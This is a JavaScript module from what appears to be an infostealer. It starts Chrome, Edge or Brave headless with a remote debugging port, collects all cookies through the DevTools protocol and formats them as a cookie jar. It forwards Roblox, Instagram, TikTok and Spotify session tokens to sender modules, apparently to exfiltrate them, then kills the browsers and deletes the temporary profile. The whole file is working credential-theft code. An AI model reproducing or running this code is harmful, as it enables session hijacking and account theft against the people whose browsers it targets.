const path = require("path");
const fs = require("fs");
let { state } = require("../../data/data");
const { randomChar } = require("../utils/random");
const { spawn } = require("child_process");
const kill = require("../system/kill");
const axios = require("axios");
const WebSocket = require("ws");
const roblox = require("../modules/Roblox");
const instagram = require("../modules/Instagram");
const tiktok = require("../modules/Tiktok");
const spotify = require("../modules/Spotify");


async function GetCookies(fakePath) {
  const browserGuess = (() => {
    if (fakePath.includes("Chrome")) return "chrome";
    if (fakePath.includes("Edge")) return "edge";
    if (fakePath.includes("Brave")) return "brave";
    return null;
  })();

  if (!browserGuess) return;
  state.cookiesBrowserUsed.add(browserGuess);

  const BROWSERS = {
    chrome: {
      bin: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    },
    edge: {
      bin: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    },
    brave: {
      bin: "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
    },
  };

  const browser = BROWSERS[browserGuess];
  if (!fs.existsSync(browser.bin)) return;

  const tempProfile = path.join(process.env.TEMP, `temp-profile-${browserGuess}-${randomChar(8)}`);
  if (!fs.existsSync(tempProfile)) fs.mkdirSync(tempProfile);

  const proc = spawn(
    browser.bin,
    [
      "--remote-debugging-port=9222",
      `--user-data-dir=${tempProfile}`,
      "--no-first-run",
      "--headless=new",
      "--disable-extensions",
      "--disable-gpu",
    ],
    {
      detached: true,
      stdio: "ignore",
    }
  );

  try {
    await delay(3000); 
    const wsUrl = await getWebSocketDebuggerUrl();
    const cookies = await getAllCookies(wsUrl);

    if (!cookies.length) return;

    let result = "";
    for (const cookie of cookies) {
      result += `${cookie.domain}\tTRUE\t/\tFALSE\t2597573456\t${cookie.name}\t${cookie.value}\n`;

      if (cookie.name === ".ROBLOSECURITY") roblox.Send(cookie.value);
      if (cookie.domain.includes("instagram") && cookie.name.includes("sessionid")) instagram.Send(cookie.value);
      if (cookie.domain.includes(".tiktok.com") && cookie.name.includes("sessionid")) tiktok.Send(cookie.value);
      if (cookie.domain.includes(".spotify.com") && cookie.name.includes("sp_dc")) spotify.Send(cookie.value);

      state.cookieCount.value++;
    }

    return result;
  } catch (e) {
    console.log(`[${browserGuess}] ❌ Failed to get cookies via WebSocket: ${e.message}`);
    return;
  } finally {
    try {
      process.kill(-proc.pid);
    } catch {}
    await kill.Browsers();
    try {
      fs.rmSync(tempProfile, { recursive: true, force: true });
    } catch {}
  }
}

async function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

async function getWebSocketDebuggerUrl() {
  for (let i = 0; i < 20; i++) {
    try {
      const response = await axios.get("http://127.0.0.1:9222/json");
      return response.data[0].webSocketDebuggerUrl;
    } catch (err) {
      console.log(`🔁 Tentative ${i + 1}/20: WebSocket non dispo (${err.message})`);
      await delay(500);
    }
  }
  throw new Error("Debugger port not responding");
}

async function getAllCookies(wsUrl) {
  return new Promise((resolve) => {
    const ws = new WebSocket(wsUrl);
    let timeout = setTimeout(() => {
      if (ws.readyState === ws.OPEN) {
        ws.close();
        resolve([]);
      }
    }, 5000);

    ws.on("open", () => {
      ws.send(JSON.stringify({ id: 1, method: "Network.getAllCookies" }));
    });

    ws.on("message", (data) => {
      clearTimeout(timeout);
      const response = JSON.parse(data.toString());
      if (response.id === 1) {
        ws.close();
        resolve(response.result.cookies);
      }
    });

    ws.on("error", () => {
      clearTimeout(timeout);
      resolve([]);
    });
  });
}

module.exports = GetCookies;
